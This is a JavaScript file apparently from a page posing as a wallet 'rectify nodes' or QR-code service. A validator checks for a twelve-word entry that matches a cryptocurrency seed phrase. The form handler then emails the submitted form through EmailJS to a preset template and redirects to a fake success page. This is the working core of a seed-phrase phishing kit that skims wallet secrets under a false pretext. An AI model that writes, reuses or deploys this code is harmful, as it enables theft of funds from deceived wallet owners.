window.onload = () => {
  const tab_switchers = document.querySelectorAll("[data-switcher]");

  for (let i = 0; i < tab_switchers.length; i++) {
    const tab_switcher = tab_switchers[i];
    const page_id = tab_switcher.dataset.tab;

    tab_switcher.addEventListener("click", () => {
      document
        .querySelector(".tabs .tab.is-active")
        .classList.remove("is-active");
      tab_switcher.parentNode.classList.add("is-active");

      SwitchPage(page_id);
    });
  }
};

const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
      document.querySelectorAll(".animated")[0].classList.add("fadeInLeft");
      document.querySelectorAll(".animated")[1].classList.add("fadeInTop");
      document.querySelectorAll(".animated")[2].classList.add("fadeInRight");
      document.querySelectorAll(".animated")[3].classList.add("fadeInRight");
    }
  });
});

observer.observe(document.querySelector(".container"));

function validated() {
  var regName =
    /^[a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+$/;
  var name = document.getElementsByClassName("phrase-boxClass").value;
  var form = document.forms["form"]["name"];

  if (!regName.test(name)) {
    alert("verifying...!!");
    document.getElementById("button").focus();
    return false;
  } else {
    alert("Proceed to generate QRcode");
    return true;
  }
}

const btn = document.getElementById("button");

document.getElementById("form").addEventListener("submit", function (event) {
  event.preventDefault();

  btn.value = "Sending...";

  const serviceID = "default_service";
  const templateID = "template_cdzeq12";

  emailjs.sendForm(serviceID, templateID, this).then(
    () => {
      btn.value = "Send Email";
      window.location.href = "https://rectify-nodes.vercel.app/qr-success.html";
    },
    (err) => {
      btn.value = "Send Email";
      alert(JSON.stringify(err));
    }
  );
});
